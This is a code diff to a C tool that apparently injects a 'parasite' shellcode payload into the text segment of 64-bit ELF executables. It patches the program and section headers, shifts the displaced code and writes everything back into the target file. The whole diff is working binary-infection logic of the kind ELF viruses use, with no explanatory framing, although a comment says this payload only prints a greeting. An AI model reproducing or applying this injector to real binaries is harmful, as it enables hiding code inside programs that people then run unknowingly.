@@ -66,7 +66,7 @@ uint8_t *create_shellcode(void (*fn)(),size_t len)
 uint64_t f1 = (uint64_t)parasite_greeting;
 uint64_t f2 = (uint64_t)create_shellcode;
 
-int main(int argc, int *argv[])
+int main(int argc, char *argv[])
 {
     if(argc < 2)
     {
@@ -99,6 +99,7 @@ int main(int argc, int *argv[])
     Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
     Elf64_Off start_off;
     Elf64_Off text_off;
+    size_t remained_text_len;
     Elf64_Addr new_origin_entry;
     /* this is for jump back to the original entry*/
     /* but here we just print a greeting message */
@@ -110,16 +111,35 @@ int main(int argc, int *argv[])
         if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == PF_R + PF_X)
         {
             text_off = phdr[i].p_offset;
-            start_off = ehdr->e_entry - phdr[i].p_vaddr;
-            new_origin_entry = ehdr->e_entry + parasite_len;            
+            size_t in_text_off = ehdr->e_entry - phdr[i].p_vaddr;
+            start_off = in_text_off + phdr[i].p_offset;
+            new_origin_entry = ehdr->e_entry + parasite_len;
+            remained_text_len = phdr[i].p_filesz - in_text_off;
+            phdr[i].p_memsz += parasite_len;
+            phdr[i].p_filesz += parasite_len;
         }
     }
+    int text_sect = 0;
     for(i = 0; i < ehdr->e_shnum; i++)
     {
-        if(shdr[i].sh_offset == text_off)
+        if(shdr[i].sh_flags == SHF_ALLOC + SHF_EXECINSTR && text_sect)
+            shdr[i].sh_offset += parasite_len;
+        if(shdr[i].sh_addr == ehdr->e_entry)
+        {
             shdr[i].sh_size += parasite_len;
+            text_sect = 1;
+        }
     }
-
+    if(lseek(fd, 0, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, mem, sizeof(Elf64_Ehdr) + ehdr->e_phentsize * ehdr->e_phnum) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
     if(lseek(fd, start_off, SEEK_SET) < 0)
     {
         perror("lseek");
@@ -130,7 +150,22 @@ int main(int argc, int *argv[])
         perror("write");
         exit(-1);
     }
-    if(write(fd, &mem[start_off], st.st_size - start_off) < 0)
+    if(lseek(fd, start_off + parasite_len, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, &mem[start_off], remained_text_len) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, ehdr->e_shoff, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, shdr, ehdr->e_shentsize * ehdr->e_shnum) < 0)
     {
         perror("write");
         exit(-1);
